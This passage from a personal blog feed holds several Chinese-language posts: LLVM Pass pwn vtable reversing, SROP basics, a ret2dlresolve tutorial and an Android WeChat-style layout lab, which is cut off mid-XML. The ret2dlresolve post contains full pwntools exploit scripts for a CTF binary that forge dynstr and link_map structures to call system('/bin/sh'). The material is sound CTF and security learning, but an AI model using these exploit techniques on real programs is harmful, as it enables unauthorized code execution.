Pass逆向分析</h2><p>刚刚生成了LLVMHello.so这个pass文件，比赛题和上面也一样，会重写<code>FunctionPass</code>类中的<code>runOnFunction</code>函数，所以我们对上面的示例程序进行逆向分析，看一下虚表位置这样方便比赛的时候确定每个函数的位置</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/Yi63r1Ju9amMwxf.png'><img src="https://s2.loli.net/2023/10/28/Yi63r1Ju9amMwxf.png" alt="image.png"></p><p>跟进RegisterPass</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/75lPFTus26yqtnf.png'><img src="https://s2.loli.net/2023/10/28/75lPFTus26yqtnf.png" alt="image.png"></p><p>发现调用了callDefaultCtor进行对象创建，跟进它</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/LUV5XROSuFNvtMm.png'><img src="https://s2.loli.net/2023/10/28/LUV5XROSuFNvtMm.png" alt="image.png"></p><p>给Hello对象分配了0x20个空间，跟进Hello</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/EyKMYARvXJco7gu.png'><img src="https://s2.loli.net/2023/10/28/EyKMYARvXJco7gu.png" alt="image.png"></p><p>看到虚表了，直接跟进</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/uP6tBspbYAe4HwU.png'><img src="https://s2.loli.net/2023/10/28/uP6tBspbYAe4HwU.png" alt="image.png"></p><p><code>runOnFunction</code>函数位于虚表中的最后一个位置，因为runOnFunction函数被我们重写了，所以它指向的是我们自定义的那个函数，比赛题的漏洞基本就是这个，所以在做LLVM Pass pwn的时候定位函数的位置可以从虚表入手</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>收获很大，从编译过程到LLVM，加固了计算机底层的一些知识，知道了LLVM PASS PWN该怎么入手，以前看到LLVM PASS PWN的时候都不知道怎么运行（XD），这里第一篇就结束了，后面会继续更新</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/130702001">https://zhuanlan.zhihu.com/p/130702001</a></p><p><a href="https://zhuanlan.zhihu.com/p/122522485">https://zhuanlan.zhihu.com/p/122522485</a></p><p><a href="https://www.homedt.net/196837.html">https://www.homedt.net/196837.html</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;LLVM PASS PWN（一）&lt;/h1&gt;
&lt;h2 id=&quot;前置知识简述&quot;&gt;&lt;a href=&quot;#前置知识简述&quot; class=&quot;headerlink&quot; title=&quot;前置知识简述&quot;&gt;&lt;/a&gt;前置知识简述&lt;/h2&gt;
&lt;h3 id=&quot;为什么要编译程序&quot;&gt;&lt;a href=&quot;#为什</summary>
      
    
    
    
    <category term="LLVM PASS PWN" scheme="https://kylinxin.github.io/categories/LLVM-PASS-PWN/"/>
    
    
    <category term="LLVM PASS PWN（一）" scheme="https://kylinxin.github.io/tags/LLVM-PASS-PWN%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://kylinxin.github.io/2023/10/25/SROP/"/>
    <id>https://kylinxin.github.io/2023/10/25/SROP/</id>
    <published>2023-10-25T15:14:29.000Z</published>
    <updated>2023-10-25T10:30:13.758Z</updated>
    
    <content type="html"><![CDATA[<h1>高级ROP-SROP</h1><p>之前一直没掌握SROP技术，以此篇重新学习一下SROP</p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>在目前的pwntools中已经集成了对于srop的攻击。</p><h3 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h3><p>在汇编代码中看到存在systemcall的时候可以考虑采用该方法进行尝试</p><p>下面给出我们将会用到的64位函数及函数调用号和函数原型</p><table><thead><tr><th>系统调用</th><th>调用号</th><th>函数原型</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>read( int fd, void *buf, size_t count )</td></tr><tr><td>write</td><td>1</td><td>write( int fd, const void *buf, size_t count )</td></tr><tr><td>sigreturn</td><td>15</td><td>int sigreturn( … )</td></tr><tr><td>execve</td><td>59</td><td>execve( const char *filename, char *const argv[], char *const envp[] )</td></tr></tbody></table><p>###使用sigreturn对read函数调用的寄存器进行部署<br>接下来就需要注意了，我们进入构造的阶段。我们需要通过sigreturn的调用来实现对read函数调用寄存器的部署。值得高兴的是pwntools中已经有了调用sigreturn的功能，所以在写EXP的时候可以直接使用。再部署之前我们需要之想好在哪几个寄存器中部署什么值，下面列出来一一讲解</p><table><thead><tr><th>寄存器和指令</th><th>存储数据</th></tr></thead><tbody><tr><td>rax</td><td>系统调用号</td></tr><tr><td>rdi</td><td>0</td></tr><tr><td>rsi</td><td>addr</td></tr><tr><td>rdx</td><td>len</td></tr><tr><td>rsp</td><td>addr</td></tr><tr><td>rip</td><td>syscall_ret</td></tr></tbody></table><blockquote><p>首先是rax寄存器中一定是存放read函数的系统调用号啦，因为原汇编代码使用的是syscall，这个不多说了<br>●rdi寄存器作为read函数的一参，0代表标准输入<br>●rsi寄存器作为read函数的二参，里面存放的是前面通过write函数打印出来的新栈顶的地址，也就是说将接收到的信息写到我们前面通过write函数打印的新栈顶的位置<br>●rdx作为read函数的三参写0x400个字节<br>●rsp寄存器需要和rsi保持一致，在写的时候写在rsp指向的位置<br>●rip寄存器指向syscall_ret，确保在read函数寄存器部署成功之后可以直接调用read函数</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;高级ROP-SROP&lt;/h1&gt;
&lt;p&gt;之前一直没掌握SROP技术，以此篇重新学习一下SROP&lt;/p&gt;
&lt;h3 id=&quot;利用工具&quot;&gt;&lt;a href=&quot;#利用工具&quot; class=&quot;headerlink&quot; title=&quot;利用工具&quot;&gt;&lt;/a&gt;利用工具&lt;/h3&gt;
&lt;p&gt;在目前的pw</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="SROP" scheme="https://kylinxin.github.io/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="https://kylinxin.github.io/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kylinxin.github.io/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-10-25T15:14:29.000Z</published>
    <updated>2023-10-25T12:43:55.773Z</updated>
    
    <content type="html"><![CDATA[<h1></h1><p>借鉴文档：<a href="https://blog.csdn.net/qq_51868336/article/details/114644569?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjE0OTksImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODIyMTE5OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzNTY3NjEwMX0.6h_vJ55b-Q434hFOdAu0-8iK6sq18c0emOswHSLqfH4">【精选】ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客</a></p><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在<a href="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020">Linux</a>中，程序使用_dl_runtime_resolve(link_map,reloc_offset)来对动态链接的函数进行重定位。</p><p>而ret2dlresolve攻击的核心就是控制相应的参数及其对应地址的内容，从而控制解析的函数。</p><h3 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h3><p>第一次调用一个函数时，先是到plt表，然后jmp到got表</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/2gimIN6C7SLXRp3.png'><img src="https://s2.loli.net/2023/10/25/2gimIN6C7SLXRp3.png" alt="image.png"></p><p>此时got表存的地址是在plt表上</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/lvKA2cjSYiwhPxW.png'><img src="https://s2.loli.net/2023/10/25/lvKA2cjSYiwhPxW.png" alt="image.png"></p><p>其实也就是jmp got的下一条指令，这里先是push一个数字（该函数在rel.plt上的偏移,reloc_arg，后文会讲到），然后jmp到plt[0] (0x8048380)</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/4heH2vXBcwJuPVd.png'><img src="https://s2.loli.net/2023/10/25/4heH2vXBcwJuPVd.png" alt="image.png"></p><p>在plt[0]处先是push got[1]，got[1]就是link_map（链接器的标识信息,后文会讲到），然后jmp到got[2]处，got[2]就是_dl_runtime_resolve函数的地址</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/FAk9bBdJD1OQus6.png'><img src="https://s2.loli.net/2023/10/25/FAk9bBdJD1OQus6.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/tdvWZqcRnPQgjHL.png'><img src="https://s2.loli.net/2023/10/25/tdvWZqcRnPQgjHL.png" alt="image.png"></p><p>所以相当于执行了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_runtime_resolve(link_map,reloc_arg)<br></code></pre></td></tr></tbody></table></figure><p>这个函数会完成符号的解析，即将真实的write函数地址写入其GOT表对应的条目中，随后将控制器交给被解析的函数</p><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO-RELRO"></a>NO RELRO</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><br>r = process(<span class="hljs-string">'./'</span>)  <br>elf = ELF(<span class="hljs-string">'./'</span>)  <br>read_plt = elf.plt[<span class="hljs-string">'read'</span>]  <br><span class="hljs-comment">#我们攻击的目标，.dynamic中strtab的地址，我们要在此处修改指向fake_dynstr  </span><br>target_addr = <span class="hljs-number">0x600988</span> + <span class="hljs-number">8</span>  <br><span class="hljs-comment">#用于加载函数地址的函数，当我们伪造了dynstr后，再次调用即可加载我们需要的函数  </span><br><span class="hljs-comment">#plt起始地址</span><br>plt0_load =    <br><span class="hljs-comment">#pop rdi;ret;  </span><br>pop_rdi =  <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret  </span><br>pop_rsi = <br><span class="hljs-comment">#伪造dynstr  </span><br>fake_dynstr = <span class="hljs-string">'\x00libc.so.6\x00stdin\x00system\x00'</span> <span class="hljs-comment">#原本dynstr为\x00libc.so.6\x00stdin\x00strlen\x00'</span><br><span class="hljs-comment">#bss段起始地址</span><br>bss =   <br>offset = <br>payload = flat(<span class="hljs-string">'a'</span> * offset , pop_rdi , <span class="hljs-number">0</span> , pop_rsi , bss , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># 将'/bin/sh'以及伪造的strtab写入bss段</span><br>                pop_rdi , <span class="hljs-number">0</span> , pop_rsi , target_addr , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># 将.dynamic中的strtab地址改为我们伪造的strtab的地址</span><br>                pop_rdi , bss , plt0_load , <span class="hljs-number">1</span> <span class="hljs-comment"># 调用.dl_fixup,解析strlen函数，由于我们已经在fake_strtab中将strlen替换成system，所以将会解析system函数</span><br><br>)<br><br>r.recvuntil(<span class="hljs-string">'Welcome to XDCTF2015~!\n'</span>)<br>r.sendline(payload)  <br><span class="hljs-comment">#发送system的参数以及伪造的strtab</span><br>payload2 = <span class="hljs-string">'/bin/sh'</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x00'</span>) + fake_dynstr  <br>sleep(<span class="hljs-number">1</span>)  <br>r.sendline(payload2)  <br>sleep(<span class="hljs-number">1</span>)  <br><span class="hljs-comment">#修改dynsym里的strtab的地址为我们伪造的dynstr的地址  </span><br>r.sendline(p64(bss + <span class="hljs-number">0x10</span>))  <br>r.interactive()  <br><br></code></pre></td></tr></tbody></table></figure><h3 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL-RELRO"></a>PARTIAL_RELRO</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><br><span class="hljs-comment">#r = gdb.debug("./parelro_x64",'break main')</span><br>r = process(<span class="hljs-string">'./'</span>)  <br>elf = ELF(<span class="hljs-string">'./'</span>)  <br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.31.so'</span>)  <br>read_plt = elf.plt[<span class="hljs-string">'read'</span>]  <br>write_got = elf.got[<span class="hljs-string">'write'</span>]  <br>vuln_addr = elf.sym[<span class="hljs-string">'vuln'</span>]  <br>  <br><span class="hljs-comment">#bss  </span><br>bss =   <br>bss_stage = bss + <span class="hljs-number">0x100</span><br>l_addr =  libc.sym[<span class="hljs-string">'system'</span>] -libc.sym[<span class="hljs-string">'write'</span>]  <span class="hljs-comment"># l_addr = -769472, 通常为负数</span><br>  <br>pop_rdi =   <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret  </span><br>pop_rsi =   <br><span class="hljs-comment">#用于解析符号dl_runtime_resolve  </span><br>plt0 = <br>plt_load = plt0 + <span class="hljs-number">6</span>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_Linkmap_payload</span>(<span class="hljs-params">fake_linkmap_addr,known_func_ptr,offset</span>):<br>    <span class="hljs-comment"># &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误</span><br>    linkmap = p64(offset &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))<span class="hljs-comment">#l_addr</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容</span><br>    linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># 可以为任意值</span><br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># 这里的值就是伪造的.rel.plt的地址</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项</span><br>    linkmap += p64((fake_linkmap_addr + <span class="hljs-number">0x30</span> - offset) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 </span><br>    linkmap += p64(<span class="hljs-number">0x7</span>) <span class="hljs-comment"># Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项</span><br>    linkmap += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># Rela-&gt;r_addend,任意值都行</span><br><br>    linkmap += p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#l_ns</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span><br>    linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># 参考IDA上.dyamisc的结构</span><br>    linkmap += p64(known_func_ptr - <span class="hljs-number">0x8</span>) <span class="hljs-comment"># 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8</span><br><br>    linkmap += <span class="hljs-string">b'/bin/sh\x00'</span><br>    linkmap = linkmap.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'A'</span>)<br>    linkmap += p64(fake_linkmap_addr) <span class="hljs-comment"># fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域</span><br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x38</span>) <span class="hljs-comment"># fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址</span><br>    linkmap = linkmap.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b'A'</span>)<br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x8</span>) <span class="hljs-comment"># fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址</span><br>    <span class="hljs-keyword">return</span> linkmap<br><br>fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)<span class="hljs-comment"># 伪造link_map</span><br><br>payload = flat( <span class="hljs-string">'a'</span> * <span class="hljs-number">120</span> ,pop_rdi, <span class="hljs-number">0</span> , pop_rsi , bss_stage , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># 把link_map写到bss段上</span><br>                pop_rsi , <span class="hljs-number">0</span> ,<span class="hljs-number">0</span> , <span class="hljs-comment"># 使栈十六字节对齐，不然调用不了system</span><br>                pop_rdi , bss_stage + <span class="hljs-number">0x48</span>  , plt_load , bss_stage , <span class="hljs-number">0</span> <span class="hljs-comment"># 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引</span><br>)<br><br>r.recvuntil(<span class="hljs-string">'Welcome to XDCTF2015~!\n'</span>)  <br>r.sendline(payload)  <br><br>r.send(fake_link_map) <br><br>r.interactive() <br><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;/h1&gt;
&lt;p&gt;借鉴文档：&lt;a href=&quot;https://blog.csdn.net/qq_51868336/article/details/114644569?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiL</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="ret2dlresolve" scheme="https://kylinxin.github.io/tags/ret2dlresolve/"/>
    
  </entry>
  
  <entry>
    <title>移动开发实验1：类微信界面</title>
    <link href="https://kylinxin.github.io/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/"/>
    <id>https://kylinxin.github.io/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/</id>
    <published>2023-10-13T15:14:29.000Z</published>
    <updated>2023-10-13T02:03:10.838Z</updated>
    
    <content type="html"><![CDATA[<h1>AS类微信界面开发</h1><h2 id="功能要求"><a href="#功能要求" class="headerlink" title="功能要求"></a>功能要求</h2><p>1.、请根据课程内容设计一个app的门户框架，需要实现3-4个tab切换效果；本功能要求需要的技术为：activity、xml、fragment</p><p>2、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；</p><h2 id="开发技术"><a href="#开发技术" class="headerlink" title="开发技术"></a>开发技术</h2><p>开发工具：as</p><p>版本：API 24 Android 7.0</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>类微信界面主要分为上中下三个部分，其中上下为 top.xml和 bottom.xml 为基础信息显示。</p><p>主界面中间部分由4个页面叠加，在进行选择内容时变换界面</p><p>其中我选择在聊天界面实现列表效果，采用 recycleview</p><h2 id="设计过程"><a href="#设计过程" class="headerlink" title="设计过程"></a>设计过程</h2><h3 id="1-导入所需图片到drawable目录下"><a href="#1-导入所需图片到drawable目录下" class="headerlink" title="1-导入所需图片到drawable目录下"></a>1. 导入所需图片到drawable目录下</h3><p class='item-img' data-src='https://s2.loli.net/2023/10/07/LjBczXaqGKstNWU.png'><img src="https://s2.loli.net/2023/10/07/LjBczXaqGKstNWU.png" alt="image.png"></p><h3 id="2-布局设计-xml文件编写"><a href="#2-布局设计-xml文件编写" class="headerlink" title="2-布局设计-xml文件编写"></a>2. 布局设计 xml文件编写</h3><h4 id="标题栏top-xml"><a href="#标题栏top-xml" class="headerlink" title="标题栏top-xml"></a>标题栏top.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/4eP9i3LUb8Wpnlj.png'><img src="https://s2.loli.net/2023/10/07/4eP9i3LUb8Wpnlj.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/textView"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center_horizontal"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"微信"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"40sp"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TextView</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="底部选择栏bottom-xml"><a href="#底部选择栏bottom-xml" class="headerlink" title="底部选择栏bottom-xml"></a>底部选择栏bottom.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/bWVDtUKMs6ayRq7.png'><img src="https://s2.loli.net/2023/10/07/bWVDtUKMs6ayRq7.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:baselineAligned</span>=<span class="hljs-string">"false"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 微信--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx"</span></span><br><span class="hljs-tag">        <span 